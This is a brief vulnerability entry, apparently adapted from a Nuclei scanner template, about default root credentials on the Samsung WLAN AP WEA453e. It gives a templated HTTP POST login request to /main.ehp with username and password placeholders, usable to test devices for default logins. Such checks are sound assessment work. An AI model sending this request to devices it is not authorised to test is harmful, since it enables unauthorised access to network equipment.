# Vulnerability: Samsung Wlan AP (WEA453e) Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`samsung-wlan-default-login.yaml`)

## Description
Samsung Wlan AP (WEA453e) default root credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /main.ehp HTTP/1.1
Host: {{Hostname}}

httpd;General;lang=en&login_id={{username}}&login_pw={{password}}
```

